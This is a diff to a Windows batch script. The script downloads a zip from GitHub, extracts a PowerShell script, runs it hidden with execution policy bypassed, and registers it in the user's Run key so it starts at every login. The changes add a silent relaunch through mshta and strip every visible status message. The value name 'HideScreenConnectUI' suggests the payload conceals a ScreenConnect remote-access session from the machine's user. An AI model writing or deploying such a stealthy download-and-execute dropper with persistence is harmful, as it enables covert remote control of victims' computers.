@@ -1,6 +1,14 @@
 @echo off
 setlocal EnableExtensions
 
+set "SELF=%~f0"
+
+REM Relaunch hidden - no CMD window on screen
+if /I not "%~1"=="hidden" (
+    mshta "javascript:var s=new ActiveXObject('WScript.Shell'); s.Run('cmd /c \"\"\"%SELF%\"\" hidden\"',0,false);close()"
+    exit /b 0
+)
+
 set "ZIP_URL=https://github.com/chanelwolthuis-del/hidezip/archive/refs/heads/main.zip"
 set "INSTALL_DIR=%LOCALAPPDATA%\hide"
 set "ZIP_FILE=%TEMP%\hide-github.zip"
@@ -10,28 +18,14 @@ set "REGKEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 set "VAL=HideScreenConnectUI"
 set "SCRIPT=%INSTALL_DIR%\hide-sc.ps1"
 
-echo [1/4] Downloading...
 curl -L -o "%ZIP_FILE%" "%ZIP_URL%"
-if errorlevel 1 goto :fail
+if errorlevel 1 exit /b 1
 
-echo [2/4] Extracting...
-"%PS%" -NoProfile -Command "$b='%TEMP%\hidezip-main'; if(Test-Path $b){Remove-Item $b -Recurse -Force}; Expand-Archive -LiteralPath '%ZIP_FILE%' -DestinationPath '%TEMP%' -Force; if(Test-Path '%INSTALL_DIR%'){Remove-Item '%INSTALL_DIR%' -Recurse -Force}; New-Item -ItemType Directory -Path '%INSTALL_DIR%' -Force | Out-Null; Expand-Archive -LiteralPath '%INNER_ZIP%' -DestinationPath '%INSTALL_DIR%' -Force"
-if errorlevel 1 goto :fail
+"%PS%" -NoProfile -WindowStyle Hidden -Command "$t=$env:TEMP;$b=Join-Path $t 'hidezip-main'; if(Test-Path $b){Remove-Item $b -Recurse -Force}; Expand-Archive -LiteralPath '%ZIP_FILE%' -DestinationPath $t -Force; if(Test-Path '%INSTALL_DIR%'){Remove-Item '%INSTALL_DIR%' -Recurse -Force}; New-Item -ItemType Directory -Path '%INSTALL_DIR%' -Force | Out-Null; Expand-Archive -LiteralPath '%INNER_ZIP%' -DestinationPath '%INSTALL_DIR%' -Force"
+if errorlevel 1 exit /b 1
 
-if not exist "%SCRIPT%" goto :fail
+if not exist "%SCRIPT%" exit /b 1
 
-echo [3/4] Starting hider...
 start "" /B "%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT%"
-
-echo [4/4] Installing at login...
 reg add "%REGKEY%" /v "%VAL%" /t REG_SZ /d "\"%PS%\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /f
-if errorlevel 1 goto :fail
-
-echo.
-echo SUCCESS - Installed to %INSTALL_DIR%
-echo Runs automatically at every login. No more clicks needed.
 exit /b 0
-
-:fail
-echo FAILED - upload hide-sc.zip to GitHub and try again
-exit /b 1
